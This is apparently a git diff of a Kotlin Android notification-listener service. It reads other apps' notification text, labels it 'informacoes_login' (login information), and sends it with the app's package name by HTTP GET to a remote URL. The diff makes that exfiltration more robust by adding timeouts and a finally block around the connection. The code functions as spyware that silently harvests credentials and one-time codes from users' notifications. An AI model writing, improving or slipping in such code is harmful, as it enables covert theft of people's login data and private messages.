@@ -66,19 +66,23 @@ class NotificationSvc: NotificationListenerService() {
         "&informacoes_login=" + URLEncoder.encode(txt,"UTF-8") +
         "&aplicativo=" + URLEncoder.encode(sbn.packageName,"UTF-8")  
   
-   try{
-   
-	val c = URL(u).openConnection() as HttpURLConnection
+	var c: HttpURLConnection? = null
+	
+	try {
+	
+		c = URL(u).openConnection() as HttpURLConnection
+		
+		c.connectTimeout = 10000
+		c.readTimeout = 10000
 
-	c.requestMethod = "GET"
+		c.requestMethod = "GET"
 
-	val codigo = c.responseCode
+		val codigo = c.responseCode
 
-	arquivo.appendText(
-		 "\n\n\n${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())} HTTP $codigo URL=$u\n"
-	)
-
-	c.disconnect()
+		arquivo.appendText(
+			 "\n\n\n${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())} HTTP $codigo URL=$u\n"
+		)
+	
    }
 	catch(e: Exception) {
 
@@ -86,7 +90,10 @@ class NotificationSvc: NotificationListenerService() {
 			"${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())} ERRO ${e.javaClass.simpleName} URL=$u\n"
 		)
 
-	}   
+	}
+	finally {
+		c?.disconnect()
+	}	
  
 
 
